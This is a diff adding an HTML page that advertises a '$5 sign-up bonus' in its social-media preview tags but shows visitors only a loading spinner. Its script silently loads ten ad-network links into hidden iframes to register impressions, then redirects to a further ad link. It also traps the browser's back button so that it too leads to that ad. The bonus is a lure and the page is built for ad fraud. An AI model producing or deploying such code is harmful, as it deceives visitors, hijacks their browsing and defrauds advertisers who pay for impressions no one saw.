@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign-up Bonus</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph meta tags for social media preview -->
+  <meta property="og:title" content="Sign-up now and get a $5 bonus!">
+  <meta property="og:description" content="Create your account and instantly receive a $5 welcome bonus. Limited time offer!">
+  <meta property="og:url" content="https://yourdomain.com/telegram">
+  <meta property="og:image" content="https://cdn.pixabay.com/photo/2017/01/31/13/14/dollar-2028123_1280.png">
+  <meta property="og:type" content="website">
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #000;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 8px solid #333;
+      border-top: 8px solid #fff;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    p {
+      font-size: 18px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <p>Loading... Please wait</p>
+
+  <script>
+    const adLinks = [
+      "https://www.profitableratecpm.com/wrhqq1zz?key=094b8768f6943619e954ba3578a104ce",
+      "https://www.profitableratecpm.com/fs1hm4uvfs?key=65546c0280903d55d45177cb9fb09b60",
+      "https://www.profitableratecpm.com/sn93fkpjs0?key=8ce81576d8ee09fd36b218cb12fbe429",
+      "https://www.profitableratecpm.com/arspt91ur?key=ec17bbfb3eec708601bb1dbcf83b9ece",
+      "https://www.profitableratecpm.com/cbvkm9w3z?key=121132c98dd60bc080e3ca8333445543",
+      "https://www.profitableratecpm.com/mcxfb6kd2?key=2c1ead5abaca7c921168fefeee64ca6d",
+      "https://www.profitableratecpm.com/rib39wth?key=77b172979c837f7ad2d763ccbc8902f0",
+      "https://www.profitableratecpm.com/fe3sjt1cr?key=f7bae5e6fd11a7f307758e5cbc4571fc",
+      "https://www.profitableratecpm.com/w7ad8eend?key=394031af5b1f97469172980eebc1ba07",
+      "https://www.profitableratecpm.com/t00h9rtwk?key=3c5c24d54e4bbe130af565f69d4f6dcf"
+    ];
+
+    const redirectURL = "https://www.profitableratecpm.com/i9v2m2xn?key=e1a1ac511489648fb9b3abe7e65ff26b";
+    let index = 0;
+
+    function fireImpression(link) {
+      const iframe = document.createElement("iframe");
+      iframe.src = link;
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+    }
+
+    function loadAds() {
+      if (index < adLinks.length) {
+        fireImpression(adLinks[index]);
+        index++;
+        setTimeout(loadAds, 200);
+      } else {
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 1000);
+      }
+    }
+
+    history.pushState(null, "", location.href);
+    window.addEventListener("popstate", function () {
+      location.href = redirectURL;
+    });
+
+    window.onload = loadAds;
+  </script>
+</body>
+</html>
